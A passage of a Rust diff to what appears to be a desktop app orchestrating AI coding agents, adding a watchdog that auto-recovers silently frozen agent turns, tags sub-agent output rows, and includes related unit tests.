 /// from the runaway/stall gates (i.e. it's legitimately waiting on the human)?
 /// A lead's asks all carry dir "lead" (the ask hook is injected with "lead" —
@@ -4795,7 +5055,8 @@ fn ask_blocks(k_dir: &str, k_thread: i32, ask_dir: &str, thread_id: i32) -> bool
 
 /// Is there an open PERMISSION ask (AskRegistry) that legitimately blocks this
 /// engine's turn on the human — i.e. it's waiting, not stalled? Thread-scoped for
-/// lead asks via `ask_blocks`. Used by both the stall gate and the kill gate.
+/// lead asks via `ask_blocks`. Used by the stall gate, the kill gate, and the
+/// turn-freeze auto-recovery gate (issue #93).
 fn has_blocking_perm_ask(app: &AppHandle, ask_dir: &str, thread_id: i32) -> bool {
     app.try_state::<crate::ask::AskRegistry>()
         .map(|a| {
@@ -4813,11 +5074,15 @@ enum SweepOutcome {
     Idle,
     /// Busy turn. `stall_flip`: Some(true) just crossed into stalled, Some(false)
     /// just recovered, None unchanged. `kill`: the runaway verdict to enforce.
+    /// `freeze_fire`: true on the rising edge into turn-freeze territory (issue
+    /// #93) — set only once per silent episode (the caller tracks that), never
+    /// re-asserted every tick like `stall_flip`'s `None`-while-still-stalled case.
     Busy {
         stall_flip: Option<bool>,
         thread: i32,
         dir: String,
         kill: Option<String>,
+        freeze_fire: bool,
     },
 }
 
@@ -4879,8 +5144,365 @@ fn stall_notice_text(stall_secs: u64) -> String {
     )
 }
 
-/// Runaway guard (§7 跑飞护栏) + stall visibility (任务停滞可见): every 15s, sweep
-/// all live engines. TWO independent concerns share the one clock read:
+/// Clear the native session id for whichever surface this engine drives — the
+/// DB half of the turn-freeze auto-recovery (issue #93). Mirrors
+/// `persist_activity`'s session/lead dispatch, but routes to the `_opt`
+/// setters (already shipped for `rewind`'s "back to before the first message"
+/// case) so the id can be cleared rather than merely overwritten: a cleared id
+/// means the next send starts a brand-new native session instead of resuming
+/// one whose transport may still be wedged.
+async fn clear_native_id(db: &Db, session_id: Option<i32>, thread_id: i32) -> anyhow::Result<()> {
+    match session_id {
+        Some(sid) => repo::set_session_native_id_opt(db, sid, None).await,
+        None => repo::set_lead_native_id_opt(db, thread_id, None).await,
+    }
+}
+
+/// Explains the auto-recovery on the Needs-you feed (issue #93). Unlike the
+/// self-clearing stall hint, there is nothing left to "recover" from by the
+/// time this posts — the turn is already over and its native context WAS
+/// reset — so this is a persistent `ask_human` notice (same choice as the
+/// runaway-guard kill below), not a self-retracting `notify_human`.
+fn freeze_recovery_text(freeze_secs: u64) -> String {
+    format!(
+        "🔌 该 turn 已静默 {} 无任何输出，疑似传输层冻结——已自动中断并重置为全新会话继续。历史对话仍保留在时间线里，但新会话不带原生上下文；如果后续回复像「忘记」了之前的内容，请重新提示一下关键信息。",
+        human_dur(freeze_secs)
+    )
+}
+
+/// Drained turn artifacts from [`reset_frozen_appserver_turn`], handed back to
+/// the caller to finalize OUTSIDE the lock — same captured-exactly-these-ids
+/// discipline `cleanup_disconnected_turn` / `stop_quiet` use, so a session-wide
+/// sweep after the lock drops can never catch a concurrent send's freshly
+/// inserted row and fail a message that is about to be delivered.
+struct FrozenTurnDrain {
+    current: Option<(i32, String)>,
+    // agent_thread (issue #99) rides along so this freeze doesn't drop the
+    // sub-agent tag a cold reload would otherwise disagree with the live
+    // view on — same reasoning as `cleanup_disconnected_turn`'s orphan_texts.
+    orphan_texts: Vec<(i32, String, Option<String>)>,
+    orphan_tools: Vec<(i32, serde_json::Value)>,
+    drained_queue: Vec<i32>,
+    turn_saw_text: bool,
+}
+
+/// Pure state reset for `recover_from_freeze`'s app-server path (review round
+/// 2, P1): `codex_client.take()+shutdown()` just severed the connection
+/// `codex_consumer` was reading, which makes ITS OWN tail-of-loop disconnect
+/// check (`still_active`, gated on `codex_client` still pointing at the SAME
+/// client) read false — so `cleanup_disconnected_turn` never runs, and no
+/// clean `TurnEnd` is ever coming either (the whole point of this feature is
+/// that the transport is wedged). Nothing else will reset this turn's
+/// `busy`/`tool_rows`/`current` — this is that reset, done by hand.
+///
+/// Mirrors `cleanup_disconnected_turn`'s field resets but deliberately lands
+/// at IDLE, not its `stopped=true` STATUS_STOPPED hard state:
+/// `recover_from_freeze` must land in the same honest, resumable idle state a
+/// normal interrupt does (see its doc comment). For the same reason
+/// `reset_epoch` is NOT bumped here (unlike `stop_quiet`/
+/// `cleanup_disconnected_turn`'s STOP semantics) — an in-flight send whose
+/// Phase 1 reserved against the busy turn just before this fires still
+/// promotes cleanly onto the fresh idle engine at Phase 3
+/// (`send_reservation_valid`'s "continuity reset" case) instead of being
+/// invalidated the way a hard stop/cleanup would invalidate it.
+///
+/// `turn_id` is the turn this recovery targets, captured before the
+/// (possibly ~120s) `interrupt()` RPC wait. Guarded exactly like
+/// `reset_failed_hidden_turn`: a mismatch — or the turn having already gone
+/// idle on its own, e.g. a very-delayed clean `TurnEnd` that slipped in
+/// during that wait — means a NEWER turn may already be live on this engine;
+/// leave it untouched and return `None` rather than destroying state that has
+/// nothing to do with the frozen turn.
+fn reset_frozen_appserver_turn(inner: &mut EngineInner, turn_id: i32) -> Option<FrozenTurnDrain> {
+    if inner.turn_id != turn_id || !inner.turn.busy {
+        return None;
+    }
+    let current = inner.current.take().map(|(id, text, _)| (id, text));
+    let orphan_texts: Vec<(i32, String, Option<String>)> = inner
+        .open_texts
+        .drain()
+        .map(|(_, r)| (r.row, r.buf, r.agent_thread))
+        .collect();
+    let orphan_tools: Vec<(i32, serde_json::Value)> =
+        inner.tool_rows.drain().map(|(_, v)| v).collect();
+    let drained_queue: Vec<i32> = inner.turn.queue.iter().filter_map(|o| o.queue_id).collect();
+    let turn_saw_text = inner.turn_saw_text;
+    inner.turn = TurnState::default();
+    inner.clock = TurnClock::default();
+    inner.turn_saw_text = false;
+    inner.interrupting = false;
+    inner.current_origin_tag = None;
+    inner.child = None;
+    inner.stdin = None;
+    Some(FrozenTurnDrain {
+        current,
+        orphan_texts,
+        orphan_tools,
+        drained_queue,
+        turn_saw_text,
+    })
+}
+
+/// Outcome of [`take_frozen_turn`]'s atomic re-validation (review round 4,
+/// P1). See that function's doc for the race this closes.
+enum FreezeClaim {
+    /// The turn already moved on since the freeze verdict was computed — it
+    /// ended cleanly, or advanced to a NEWER turn (`codex_consumer`'s flush
+    /// branch, this file ~L3180, starting one on the SAME shared connection)
+    /// while `interrupt()`'s up-to-~120s RPC wait was in flight. The caller
+    /// owns NOTHING here and must skip every downstream action: no
+    /// connection drop, no native-id clear, no marker, no user notice.
+    /// Acting anyway is the review round 4 P1 bug — an earlier version took
+    /// + shut down the connection unconditionally, severing the NEWER turn's
+    /// live transport out from under it and leaving that turn permanently
+    /// `busy` with no client left to ever finish or clean it up.
+    Stale,
+    /// Still the SAME turn as of this check: this call exclusively owns
+    /// whatever cleanup follows. `Some` only for the app-server dialect — a
+    /// live `codex_client` was taken and its turn state reset by hand (see
+    /// [`reset_frozen_appserver_turn`] for why that hand-reset is necessary
+    /// once the connection is severed). `None` for every other dialect (claude
+    /// resident / codex-exec / opencode): `interrupt()` already killed their
+    /// child, and THEIR OWN reader task resets turn state once it observes
+    /// EOF (guarded by its own `generation` check, independent of this
+    /// function) — resetting it again here would race that cleanup, so this
+    /// deliberately leaves it alone.
+    Owned(Option<(crate::codex_app_server::Client, FrozenTurnDrain)>),
+}
+
+/// Re-confirm turn ownership AND (app-server dialect) take the live client,
+/// atomically under ONE lock acquisition (review round 4, P1). An earlier
+/// version of `recover_from_freeze` checked turn_id+busy inside
+/// `reset_frozen_appserver_turn`'s own guard, but took `codex_client` in a
+/// SEPARATE, EARLIER lock acquisition — first `{ eng.lock().await
+/// .codex_client.take() }`, THEN (after `.shutdown()`) a second `{
+/// eng.lock().await; reset_frozen_appserver_turn(...) }`. Between those two
+/// locks — indeed across the whole up-to-~120s `interrupt()` wait that
+/// precedes both — `codex_consumer`'s flush branch (this file, ~L3180) can
+/// observe a clean `TurnEnd` for the frozen turn and `start_turn` a NEW one
+/// on the SAME shared connection (`codex_client` is never reassigned by that
+/// path, and `busy` stays true). The first lock would then take the
+/// connection that's now serving the NEWER turn; `shutdown()` severs it out
+/// from under that turn; the second lock's guard correctly refuses to touch
+/// the newer turn's in-memory state (turn_id no longer matches) — but
+/// nothing undoes the disconnect that already happened. The newer turn is
+/// left permanently `busy` with a dead client: `codex_consumer`'s own
+/// `still_active` check (~L3345) also reads false once `codex_client` is
+/// gone, so it skips its OWN disconnect cleanup too — nothing short of the
+/// runaway idle cap ever resets that turn again, and the freeze watchdog can
+/// never re-fire for this engine (`freeze_handled` only clears on `Idle`).
+///
+/// Folding the check and the take into ONE synchronous critical section (no
+/// `.await` between them, no re-lock) closes the window: either
+/// `inner.turn_id`/`busy` still match RIGHT UP TO the moment `codex_client`
+/// is taken — in which case no concurrent flush could have started a newer
+/// turn on it — or they don't, in which case nothing is taken and this
+/// reports [`FreezeClaim::Stale`]. This also sidesteps the OLD code's
+/// deadlock trap by construction rather than by care: `if let Some(c) =
+/// eng.lock().await.codex_client.take() { /* a fresh eng.lock().await HERE
+/// self-deadlocks */ }` extends the temporary `MutexGuard`'s scope over the
+/// whole if-let body (Rust's temporary-lifetime-extension for an `if let`
+/// scrutinee) — this function never needs a second lock at all, since the
+/// reset runs through the SAME `&mut EngineInner` the guard just checked.
+async fn take_frozen_turn(eng: &EngineRef, turn_id: i32) -> FreezeClaim {
+    let mut inner = eng.lock().await;
+    if inner.turn_id != turn_id || !inner.turn.busy {
+        return FreezeClaim::Stale;
+    }
+    let client = inner.codex_client.take();
+    // `reset_frozen_appserver_turn` re-checks the SAME turn_id+busy guard
+    // just checked above — redundant in practice (this function holds ONE
+    // continuous `&mut` borrow with no `.await` in between the two checks,
+    // so nothing could have changed `inner`) but deliberately NOT asserted
+    // away with `.expect()`/`.unwrap()` (this crate's production paths ban
+    // both — see CLAUDE.md): reusing the guarded function as-is and letting
+    // `and_then`/`map` degrade a theoretically-unreachable mismatch to
+    // "nothing taken" keeps this provably panic-free, not just
+    // panic-free-by-inspection. `and_then` also means a `None` client
+    // (every non-app-server dialect) short-circuits without ever calling
+    // the reset — see [`FreezeClaim::Owned`] for why that dialect must NOT
+    // have its state reset here.
+    let taken = client
+        .and_then(|c| reset_frozen_appserver_turn(&mut inner, turn_id).map(|drain| (c, drain)));
+    FreezeClaim::Owned(taken)
+}
+
+/// Re-confirm and execute the turn-freeze auto-recovery (issue #93). The
+/// sweep's verdict was computed under a lock already dropped, so this re-runs
+/// the FULL check (busy + silent past `freeze_secs` + not legitimately blocked
+/// on a human + no open tool call) under a FRESH lock before acting — mirrors
+/// `post_stall_notice_confirmed`'s race-closing re-check. When it still holds:
+///   1. `interrupt()` — the existing soft-protocol-interrupt-then-kill-fallback
+///      path (same one a user's own Stop button rides), so the frozen turn
+///      lands in the SAME honest, resumable `idle` state a normal interrupt
+///      does (never the harder `STATUS_STOPPED` the kill gate below uses).
+///      Called INLINE (this fn is itself dispatched off the sweep loop as an
+///      independent task — see the caller) so its up-to-~120s worst case
+///      (codex app-server's `interrupt` RPC) never blocks other engines.
+///   2. [`take_frozen_turn`] — re-confirms turn_id+busy STILL match (a fresh
+///      check, after the up-to-~120s wait above) and, ATOMICALLY with that
+///      check (review round 4, P1 — see that function's doc for the race
+///      this closes), takes the app-server `codex_client` (review round 1,
+///      P1-b) if this is that dialect. `is_alive()` (which only checks the
+///      handle is populated, not real liveness) would otherwise still call a
+///      wedged connection live; taking + shutting it down here forces the
+///      next send to reconnect fresh, mirroring `stop_quiet`'s kill path.
+///      Severing the connection also makes `codex_consumer`'s OWN disconnect
+///      cleanup skip itself (review round 2, P1 — its `still_active` check
+///      reads false once `codex_client` is gone), so `take_frozen_turn`
+///      resets the turn by hand in the SAME step — see
+///      [`reset_frozen_appserver_turn`] — finalizing whatever the frozen
+///      turn left open (current/streaming rows, tool calls, queued
+///      follow-ups) as `interrupted` below. A `Stale` claim means the turn
+///      already resolved itself during the wait: steps 3-5 below must NOT
+///      run — see [`FreezeClaim`].
+///   3. Clear the native session id, so the NEXT send opens a brand-new native
+///      session instead of resuming one whose transport may still be wedged
+///      (mirrors the "no native id ⇒ fresh session next send" contract
+///      `rewind` already ships).
+///   4. Stamp a `turn_freeze_recovered` marker (`repo::mark_turn_freeze_recovered`)
+///      — an invisible timeline row recording that this recovery happened.
+///      Despite an earlier version of this comment's claim, nothing today
+///      reads it back (review round 4, P2 — see the honest doc on
+///      `repo::mark_turn_freeze_recovered`): the marker is kept as a
+///      possible future grace-window signal, but issue #116's actual
+///      protection against immediately re-driving into the same wedge comes
+///      from step 3's `native_id` clear instead (see that doc for why that's
+///      an accidental, fragile side effect rather than a designed one).
+///   5. Post a Needs-you notice — this is a self-heal, but the user should
+///      still know their native context was reset.
+/// Returns false when the turn already ended in the gap (nothing to do) —
+/// including whenever [`take_frozen_turn`] reports [`FreezeClaim::Stale`].
+async fn recover_from_freeze(app: &AppHandle, eng: &EngineRef, freeze_secs: u64) -> bool {
+    let (thread_id, session_id, dir, act, turn_id) = {
+        let inner = eng.lock().await;
+        let quiet = inner.clock.last_activity.elapsed().as_secs();
+        let has_open_ask = has_blocking_perm_ask(app, &inner.ask_dir, inner.thread_id);
+        let act = freeze_verdict(
+            inner.turn.busy,
+            quiet,
+            freeze_secs,
+            has_open_ask,
+            !inner.tool_rows.is_empty(),
+        );
+        (
+            inner.thread_id,
+            inner.session_id,
+            inner.ask_dir.clone(),
+            act,
+            inner.turn_id,
+        )
+    };
+    if !act {
+        return false;
+    }
+    let _ = interrupt(app, eng).await;
+    // Re-confirm ownership of turn `turn_id`, atomically with taking the
+    // app-server client — see `take_frozen_turn`'s doc for the review round 4
+    // P1 race this closes. `Stale` means nothing below is ours to touch: no
+    // connection drop, no native-id clear, no marker, no notice.
+    let taken = match take_frozen_turn(eng, turn_id).await {
+        FreezeClaim::Stale => return false,
+        FreezeClaim::Owned(taken) => taken,
+    };
+    if let Some((c, drain)) = taken {
+        c.shutdown().await;
+        // Round-2 P1: this shutdown makes codex_consumer's own disconnect
+        // cleanup skip itself — see `reset_frozen_appserver_turn`'s doc for
+        // why, and why `take_frozen_turn`'s reset (not
+        // `cleanup_disconnected_turn`) is the correct replacement.
+        if let Some(db) = app.try_state::<Db>() {
+            persist_activity(&db, session_id, thread_id, "idle").await;
+            // Mirrors `cleanup_disconnected_turn`'s own use of this helper:
+            // finalize whichever open row already exists (`current`), or —
+            // if the turn produced no visible output at all before it
+            // froze — insert a placeholder terminal row so the timeline
+            // doesn't just dangle with no reply and no error marker.
+            // `had_busy_turn` is unconditionally true here — this whole
+            // branch only runs when `take_frozen_turn` matched a genuinely
+            // busy turn — so only `had_orphan_texts` gates it.
+            let had_orphan_texts = !drain.orphan_texts.is_empty() || drain.turn_saw_text;
+            if let Ok(Some(row)) = persist_disconnected_turn_row(
+                &db,
+                thread_id,
+                session_id,
+                turn_id,
+                "interrupted",
+                !had_orphan_texts,
+                drain.current,
+            )
+            .await
+            {
+                match row {
+                    DisconnectedTurnRow::Finalized { message_id } => {
+                        emit_finalize(app, thread_id, message_id, "interrupted");
+                    }
+                    DisconnectedTurnRow::Inserted(message) => {
+                        let _ = app.emit(EVENT, Push::Message { thread_id, message });
+                    }
+                }
+            }
+            // Item-keyed open rows freeze like `current`: raw text + terminal
+            // status (mirrors cleanup_disconnected_turn's disconnect handling).
+            // agent_thread (issue #99) preserved via text_row_content — see
+            // FrozenTurnDrain's doc.
+            for (id, text, agent_thread) in drain.orphan_texts {
+                let _ = repo::update_lead_message(
+                    &db,
+                    id,
+                    &text_row_content(&text, agent_thread.as_deref()),
+                    "interrupted",
+                )
+                .await;
+                emit_finalize(app, thread_id, id, "interrupted");
+            }
+            finalize_orphan_tool_rows(app, &db, thread_id, drain.orphan_tools, "interrupted")
+                .await;
+            if !drain.drained_queue.is_empty() {
+                match repo::set_queued_status_by_ids(&db, &drain.drained_queue, "interrupted")
+                    .await
+                {
+                    Ok(rows) => {
+                        for m in rows {
+                            emit_finalize(app, thread_id, m.id, "interrupted");
+                        }
+                    }
+                    Err(e) => {
+                        eprintln!("[weft] turn-freeze recovery: queue finalize failed: {e}");
+                    }
+                }
+            }
+        }
+        // Tell the frontend the turn is over — nothing else will: the
+        // watchdog sweep's own idle transition (which observes `busy` on
+        // its NEXT tick) only reconciles watchdog-owned bookkeeping
+        // (stall notice / freeze_handled), it never pushes a Turn event
+        // itself, on the assumption that whatever ended the turn already
+        // did. Here, we are that "whatever".
+        emit_turn_push(app, thread_id, session_id, "idle", false, Vec::new());
+    }
+    if let Some(db) = app.try_state::<Db>() {
+        if let Err(err) = clear_native_id(&db, session_id, thread_id).await {
+            eprintln!(
+                "[weft] turn-freeze recovery: failed to clear native id for thread {thread_id}: {err}"
+            );
+        }
+        if let Err(err) = repo::mark_turn_freeze_recovered(&db, thread_id, session_id).await {
+            eprintln!(
+                "[weft] turn-freeze recovery: failed to stamp coordination marker for thread {thread_id}: {err}"
+            );
+        }
+    }
+    eng.lock().await.native_id = None;
+    if let Some(bus) = app.try_state::<crate::bus::BusRegistry>() {
+        bus.ask_human(thread_id, &dir, &freeze_recovery_text(freeze_secs));
+    }
+    true
+}
+
+/// Runaway guard (§7 跑飞护栏) + stall visibility (任务停滞可见) + turn-freeze
+/// auto-recovery (issue #93): every 15s, sweep all live engines. THREE
+/// independent concerns share the one clock read:
 ///   1. Kill — force-stop a turn past the wall cap or silent past the idle cap;
 ///      the stopped engine surfaces via Needs-you and resumes losslessly on the
 ///      next send. Caps come from GuardrailState (Settings / WEFT_* env); 0 off.
@@ -4888,6 +5510,15 @@ fn stall_notice_text(stall_secs: u64) -> String {
 ///      from the healthy green pulse) long before the minutes-long kill cap, so a
 ///      hung/stuck task is never invisible. Threshold `WEFT_STALL_HINT_SECS`
 ///      (default 480s = 8 min, 0 disables); runs even when both kill caps are off.
+///   3. Recover — a busy turn whose transport has gone silent past
+///      `WEFT_TURN_FREEZE_SECS` (default 600s = 10 min, 0 disables) — AND has
+///      no open tool call in flight, see `freeze_verdict` — is cut loose with
+///      a soft interrupt and its native session id cleared, so the NEXT send
+///      self-heals onto a fresh session instead of sitting frozen until a
+///      human notices and restarts the app (issue #93). Fires once per silent
+///      episode (dispatched off this loop as an independent task, never
+///      awaited inline here — see the call site); superseded by a kill in the
+///      same tick (one notice, the stronger action, not two).
 pub fn spawn_watchdog(app: AppHandle) {
     tauri::async_runtime::spawn(async move {
         // Env-only knob (like the cap env seeds); read once at start. 0 disables.
@@ -4895,6 +5526,9 @@ pub fn spawn_watchdog(app: AppHandle) {
         // override per run with the env var (e.g. a small value for dogfood).
         let stall_secs =
             crate::commands::env_secs("WEFT_STALL_HINT_SECS", STALL_HINT_DEFAULT_SECS);
+        // Turn-freeze auto-recovery threshold (issue #93) — see TURN_FREEZE_DEFAULT_SECS.
+        let freeze_secs =
+            crate::commands::env_secs("WEFT_TURN_FREEZE_SECS", TURN_FREEZE_DEFAULT_SECS);
         // Watchdog-owned stall state per engine key: PRESENT iff currently in a
         // stall episode; value = (thread, Needs-you notice ask id; 0 = no notice).
         // The sweep is the SOLE owner, so there's no EngineInner field to reset
@@ -4904,15 +5538,20 @@ pub fn spawn_watchdog(app: AppHandle) {
         // recover / idle / kill / prune).
         let mut stall_notices: std::collections::HashMap<i64, (i32, u64)> =
             std::collections::HashMap::new();
+        // Watchdog-owned turn-freeze state per engine key (issue #93): PRESENT
+        // iff the auto-recovery already fired for the CURRENT silent episode, so
+        // a still-wedged transport doesn't get re-interrupted / re-notified every
+        // tick. Cleared on idle (episode over) or superseded by a kill.
+        let mut freeze_handled: HashSet<i64> = HashSet::new();
         loop {
             tokio::time::sleep(std::time::Duration::from_secs(15)).await;
             let Some(guard) = app.try_state::<crate::commands::GuardrailState>() else {
                 continue;
             };
             let (idle_cap, wall_cap) = guard.get();
-            // Stall visibility runs even with both kill caps disabled; only skip the
-            // whole sweep when nothing at all is enabled.
-            if idle_cap == 0 && wall_cap == 0 && stall_secs == 0 {
+            // Stall visibility / turn-freeze recovery run even with both kill caps
+            // disabled; only skip the whole sweep when nothing at all is enabled.
+            if idle_cap == 0 && wall_cap == 0 && stall_secs == 0 && freeze_secs == 0 {
                 continue;
             }
             let engines: Vec<(i64, EngineRef)> = {
@@ -4933,6 +5572,7 @@ pub fn spawn_watchdog(app: AppHandle) {
                 cancel_stall_notice(&app, v.0, v.1);
                 false
             });
+            freeze_handled.retain(|k| live.contains(k));
             for (key, eng) in engines {
                 // Compute UNDER the lock and emit the visual flip here (this file's
                 // ordering rule — a concurrent turn-start/turn-end takes this SAME
@@ -4959,6 +5599,25 @@ pub fn spawn_watchdog(app: AppHandle) {
                             has_blocking_perm_ask(&app, &inner.ask_dir, inner.thread_id);
                         let was_stalled = stall_notices.contains_key(&key);
                         let now = stall_verdict(true, quiet, stall_secs, has_open_ask);
+                        // (3) Turn-freeze auto-recovery gate (issue #93) — rising edge
+                        // only: don't re-fire every 15s while an already-handled
+                        // episode is still (or again) past the threshold. `tool_rows`
+                        // non-empty ⇒ a tool_use has been seen with no matching
+                        // tool_result yet ⇒ exempt (review round 1, P0): claude /
+                        // codex-exec share `spawn_reader`, whose wire is silent for a
+                        // tool's ENTIRE execution (no interim event) — without this a
+                        // legitimate `cargo build` / `pnpm install` past the threshold
+                        // would be misjudged frozen and destructively interrupted. See
+                        // `freeze_verdict`'s doc for the full reasoning (incl. the
+                        // opencode residual gap).
+                        let freeze_fire = !freeze_handled.contains(&key)
+                            && freeze_verdict(
+                                true,
+                                quiet,
+                                freeze_secs,
+                                has_open_ask,
+                                !inner.tool_rows.is_empty(),
+                            );
                         // (2) Stall visibility. Re-assert `stalled` EVERY sweep while
                         // stalled (not only on the flip) so a clobbering push — a
                         // queue-change `busy`, or a post-reload hydration snapshot that
@@ -4993,6 +5652,7 @@ pub fn spawn_watchdog(app: AppHandle) {
                             // (1) Runaway kill — same caps + permission-ask gate, now
                             // correctly thread-scoped for lead asks (see ask_blocks).
                             kill: turn_verdict(busy, quiet, wall_cap, idle_cap, has_open_ask),
+                            freeze_fire,
                         }
                     }
                 };
@@ -5003,12 +5663,15 @@ pub fn spawn_watchdog(app: AppHandle) {
                         if let Some((thread, id)) = stall_notices.remove(&key) {
                             cancel_stall_notice(&app, thread, id);
                         }
+                        // Episode over (however it ended) — a future freeze starts fresh.
+                        freeze_handled.remove(&key);
                     }
                     SweepOutcome::Busy {
                         stall_flip,
                         thread,
                         dir,
                         kill,
+                        freeze_fire,
                     } => {
                         match stall_flip {
                             Some(true) => {
@@ -5033,12 +5696,40 @@ pub fn spawn_watchdog(app: AppHandle) {
                                 // Nothing to re-post.
                             }
                         }
-                        let Some(reason) = kill else { continue };
-                        // A kill supersedes the stall hint — retract it so the user
-                        // sees one notice (the auto-stop), not two.
+                        let Some(reason) = kill else {
+                            // (3) No kill this tick — consider the turn-freeze recovery.
+                            // Runs AFTER the stall bookkeeping above so a fresh stall
+                            // notice and the freeze recovery notice can coexist this one
+                            // tick (the stall hint isn't retracted here — only a KILL
+                            // supersedes it, same as before).
+                            //
+                            // Dispatched as an INDEPENDENT task, not awaited inline
+                            // (review round 1, P1-a): `recover_from_freeze` calls
+                            // `interrupt()`, which for the codex app-server dialect can
+                            // block up to ~120s inside `request()`'s bounded RPC wait —
+                            // exactly when the app-server's OWN transport is the thing
+                            // that's wedged (the freeze target scenario). Awaiting it
+                            // HERE would stall this whole sweep tick, delaying the
+                            // stall/kill/freeze checks for every OTHER busy engine at
+                            // the moment the system is most under stress. `freeze_handled`
+                            // is marked SYNCHRONOUSLY before the spawn (not from the
+                            // task's result) so a slow-to-complete recovery can't cause a
+                            // duplicate dispatch on the next tick.
+                            if freeze_fire {
+                                freeze_handled.insert(key);
+                                let (app2, eng2) = (app.clone(), eng.clone());
+                                tauri::async_runtime::spawn(async move {
+                                    recover_from_freeze(&app2, &eng2, freeze_secs).await;
+                                });
+                            }
+                            continue;
+                        };
+                        // A kill supersedes the stall hint AND any turn-freeze tracking —
+                        // retract them so the user sees one notice (the auto-stop), not two.
                         if let Some((th, id)) = stall_notices.remove(&key) {
                             cancel_stall_notice(&app, th, id);
                         }
+                        freeze_handled.remove(&key);
                         stop(&app, &eng).await;
                         if let Some(bus) = app.try_state::<crate::bus::BusRegistry>() {
                             bus.ask_human(
@@ -5062,7 +5753,7 @@ pub async fn stop_quiet(
 ) -> (
     i32,
     Option<i32>,
-    Vec<(i32, String)>,
+    Vec<(i32, String, Option<String>)>,
     Vec<(i32, serde_json::Value)>,
     Vec<u64>,
 ) {
@@ -5071,14 +5762,16 @@ pub async fn stop_quiet(
     // Open text rows: the anonymous slot PLUS the item-keyed app-server rows.
     // Hard stops also shut the codex client down, so the consumer's disconnect
     // cleanup never runs for them — without this drain an item row would stay
-    // `streaming` forever and could be finalized under a later turn.
-    let mut texts: Vec<(i32, String)> = inner
+    // `streaming` forever and could be finalized under a later turn. `current`
+    // is never a sub-agent branch (issue #99); an open_texts row carries
+    // whichever tag it was created with.
+    let mut texts: Vec<(i32, String, Option<String>)> = inner
         .current
         .take()
-        .map(|(id, text, _)| (id, text))
+        .map(|(id, text, _)| (id, text, None))
         .into_iter()
         .collect();
-    texts.extend(inner.open_texts.drain().map(|(_, (id, text, _))| (id, text)));
+    texts.extend(inner.open_texts.drain().map(|(_, r)| (r.row, r.buf, r.agent_thread)));
     // Drain tool rows still awaiting a result, but DON'T finalize here: the
     // caller makes the stop visible (sets `stopped`) first. Awaiting DB/event
     // work while the engine is reset-but-not-yet-stopped would let a concurrent
@@ -5149,11 +5842,11 @@ pub async fn stop(app: &AppHandle, eng: &EngineRef) {
         // Stop is now visible to the engine, so finalizing here can't race a
         // concurrent send into a turn we'd wrongly kill.
         finalize_orphan_tool_rows(app, &db, thread_id, orphans, "interrupted").await;
-        for (id, text) in texts {
+        for (id, text, agent_thread) in texts {
             let _ = repo::update_lead_message(
                 &db,
                 id,
-                &serde_json::json!({ "text": text }).to_string(),
+                &text_row_content(&text, agent_thread.as_deref()),
                 "interrupted",
             )
             .await;
@@ -6068,7 +6761,9 @@ fn spawn_reader(
                         },
                     );
                 }
-                super::proto::ChatEvent::Assistant { texts, tools, uuid } => {
+                super::proto::ChatEvent::Assistant { texts, tools, uuid, .. } => {
+                    // claude/exec/opencode never populate agent_thread (no
+                    // collab/sub-agent concept in these dialects) — ignored (`..`).
                     // claude assistant events carry the transcript uuid — the
                     // rewind anchor candidate for this turn (last one wins).
                     if uuid.is_some() {
@@ -6156,7 +6851,8 @@ fn spawn_reader(
                         apply_lead_sentinels(&app, &db, &mut inner, thread_id, sentinels).await;
                     }
                     // Every dialect's tool calls become inline `kind:"tool"` rows.
-                    persist_tool_calls(&app, &db, &mut inner, tools).await;
+                    // claude/exec/opencode: never a sub-agent branch (issue #99).
+                    persist_tool_calls(&app, &db, &mut inner, tools, None).await;
                 }
                 super::proto::ChatEvent::ToolResults { items } => {
                     merge_tool_results(&app, &db, &mut inner, items).await;
@@ -6408,6 +7104,19 @@ fn spawn_reader(
                 }
             }
             inner.child = None;
+            // Release the session_gate slot HERE, not on the next spawn: a per-turn
+            // process (codex/opencode) has no resident process between turns, so
+            // once its EOF is processed there is no live child left for the permit
+            // to represent. Leaving it held until `spawn_turn` overwrites
+            // `child_permit` (issue #112 dashboard review, session_gate.rs P2) meant
+            // a session sitting idle after its last turn — no queued follow-up,
+            // engine just idle — kept counting as an active slot in
+            // `session_gate::active_session_slots()` forever, until the NEXT turn
+            // (which might be minutes/never). If `next` (below) immediately spawns a
+            // queued turn, it re-acquires its own permit inside `spawn_turn` — fairly,
+            // through the same queue any other waiting session would go through,
+            // rather than this session silently keeping the slot it already earned.
+            inner.child_permit = None;
             let next = inner.turn.on_turn_end();
             // A kill-only interrupt (see interrupt()) leaves `generation`/the
             // queue untouched, so THIS EOF branch — not a reset — is what runs
@@ -6579,6 +7288,87 @@ fn emit_lead_delta(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // ---- issue #99: sub-agent branch attribution (branch_of / text_row_content) ----
+
+    #[test]
+    fn branch_of_normalizes_own_thread_to_mainline() {
+        // The session's own thread id — main narration — is NOT a branch, even
+        // though app-server tags EVERY event (including mainline ones) with a
+        // threadId. Only a DIFFERENT thread id is a genuine sub-agent.
+        assert_eq!(branch_of(Some("lead-1".into()), "lead-1"), None);
+        assert_eq!(
+            branch_of(Some("sub-1".into()), "lead-1"),
+            Some("sub-1".into())
+        );
+        // No raw thread at all (claude/exec/opencode; app-server's anonymous
+        // error slot) — always mainline, regardless of the session's own id.
+        assert_eq!(branch_of(None, "lead-1"), None);
+    }
+
+    #[test]
+    fn text_row_content_omits_tag_when_mainline() {
+        // Untagged output must be BYTE-IDENTICAL to pre-#99 rows: this is what
+        // lets an old row (persisted before this feature existed) and a fresh
+        // mainline row render through the exact same code path either side of
+        // the upgrade — no migration, no schema bump.
+        assert_eq!(text_row_content("hello", None), r#"{"text":"hello"}"#);
+    }
+
+    #[test]
+    fn text_row_content_embeds_tag_when_branched() {
+        let v: serde_json::Value =
+            serde_json::from_str(&text_row_content("hi", Some("sub-1"))).unwrap();
+        assert_eq!(v["text"], "hi");
+        assert_eq!(v["agentThread"], "sub-1");
+    }
+
+    fn test_tool_call(name: &str, collab_threads: Vec<String>) -> super::super::proto::ToolCall {
+        super::super::proto::ToolCall {
+            id: "call_1".into(),
+            name: name.into(),
+            input: serde_json::json!({}),
+            summary: String::new(),
+            output: None,
+            is_error: false,
+            collab_threads,
+        }
+    }
+
+    #[test]
+    fn tool_row_content_omits_tags_for_ordinary_mainline_call() {
+        // A mainline (non-branched, non-collab) tool row's content must be
+        // exactly what it was before #99 — no agentThread, no collabThreads key
+        // at all (not even `null`), so an old persisted row and a fresh one
+        // parse identically.
